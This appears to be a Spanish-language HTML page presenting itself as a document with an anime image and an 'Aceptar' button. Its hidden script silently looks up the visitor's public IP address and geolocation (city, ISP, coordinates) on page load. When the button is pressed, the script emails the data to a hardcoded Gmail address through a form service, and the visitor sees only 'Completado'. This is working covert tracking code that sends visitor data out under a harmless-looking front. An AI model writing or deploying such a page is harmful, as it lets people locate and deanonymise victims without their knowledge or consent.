<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documento</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
        }
        img {
            max-width: 500px;
            width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .button-container {
            margin-top: 20px;
        }
        button {
            padding: 12px 30px;
            font-size: 16px;
            background-color: #333;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.pinimg.com/originals/7d/8a/8c/7d8a8c9c5e5f5c5b5a5d5c5b5a5d5c5b.jpg" alt="Ulquiorra Cifer">
        <div class="button-container">
            <button onclick="aceptar()">Aceptar</button>
        </div>
    </div>

    <script>
        const CORREO_DESTINO = 'fernandorokefort@gmail.com';
        
        let ipPublica = '';
        let ubicacion = {};
        
        // Obtener IP Pública
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                ipPublica = data.ip;
                obtenerUbicacion(ipPublica);
            })
            .catch(error => {
                console.log('Error obteniendo IP');
            });
        
        // Obtener ubicación
        function obtenerUbicacion(ip) {
            fetch(`https://ip-api.com/json/${ip}?lang=es`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        ubicacion = data;
                    }
                })
                .catch(error => {
                    console.log('Error obteniendo ubicación');
                });
        }
        
        function aceptar() {
            enviarCorreo();
        }
        
        function enviarCorreo() {
            const mensajeCorreo = `
INFORMACIÓN DE RED:

IP Pública: ${ipPublica}

Ubicación:
País: ${ubicacion.country || 'No disponible'}
Ciudad: ${ubicacion.city || 'No disponible'}
Región: ${ubicacion.regionName || 'No disponible'}
ISP: ${ubicacion.isp || 'No disponible'}
Latitud: ${ubicacion.lat || 'No disponible'}
Longitud: ${ubicacion.lon || 'No disponible'}

Fecha: ${new Date().toLocaleString('es-ES')}
            `;
            
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    access_key: '64e9a7b5-0f0a-4a7e-b3e0-1a2b3c4d5e6f',
                    email: CORREO_DESTINO,
                    subject: 'Información de Red',
                    message: mensajeCorreo
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Completado');
                }
            })
            .catch(error => {
                alert('Error');
            });
        }
    </script>

</body>
</html>
